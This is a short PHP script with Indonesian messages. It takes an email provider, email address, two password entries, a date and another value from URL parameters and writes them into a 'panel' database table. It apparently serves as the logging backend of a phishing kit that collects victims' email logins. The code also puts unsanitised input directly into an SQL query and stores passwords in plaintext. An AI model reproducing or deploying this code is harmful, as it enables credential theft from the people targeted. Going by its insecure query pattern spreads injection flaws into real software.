<?php
header("location: ../forms-panel.php");
?>

<?php
include "../koneksi.php";

$provider = $_GET['provider'];
$mail = $_GET['mail'];
$pass1 = $_GET['pass1'];
$pass2 = $_GET['pass2'];
$date = $_GET['date'];
$rs = $_GET['rs'];

$query = mysqli_query($koneksi, "INSERT INTO panel VALUES('','$provider','$mail','$pass1','$pass2','$date','$rs')")
    or die(mysqli_error($koneksi));

if ($query) {
    echo "Selesai";
} else {
    echo "Proses input gagal, silahkan input kembali";
    echo "Silahkan klik <a href='formBarang.php'>disini</a>";
}